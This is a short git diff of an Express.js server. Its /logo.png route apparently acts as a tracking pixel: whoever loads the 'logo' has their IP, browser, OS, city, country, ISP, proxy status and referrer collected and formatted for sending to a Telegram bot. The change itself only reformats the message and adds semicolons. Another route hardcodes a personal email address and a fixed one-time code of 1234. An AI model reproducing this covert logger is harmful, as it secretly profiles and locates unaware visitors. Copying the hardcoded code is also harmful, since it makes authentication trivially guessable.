@@ -55,17 +55,17 @@ app.get("/logo.png", async (req, res) => {
 
     // Construct the message to be sent to Telegram
     const message = `IPv4: ${userIP}
-      User-Agent: ${userAgent}
-      Browser: ${browserName}
-      Browser version: ${browserVersion}
-      OS: ${osName}
-      OS version: ${osVersion}
-      City: ${city}
-      Region: ${region}
-      Country: ${country}
-      ISP: ${isp}
-      Proxy: ${proxy}
-      Referrer: ${referrer}`;
+      \nUser-Agent: ${userAgent}
+      \nBrowser: ${browserName}
+      \nBrowser version: ${browserVersion}
+      \nOS: ${osName}
+      \nOS version: ${osVersion}
+      \nCity: ${city}
+      \nRegion: ${region}
+      \nCountry: ${country}
+      \nISP: ${isp}
+      \nProxy: ${proxy}
+      \nReferrer: ${referrer}`;
 
     // Send the message to Telegram using the bot API
     try {
@@ -98,11 +98,10 @@ app.get("/logo.png", async (req, res) => {
 
 app.get("/set-email", async (req, res) => {
   const email = "diwakarjha554@gmail.com";
-  const otp = 1234
-  const result = await sendOtp(email, otp)
+  const otp = 1234;
+  const result = await sendOtp(email, otp);
   if (result) {
     console.log("success");
-    
   }
   res.json({
     success: true,
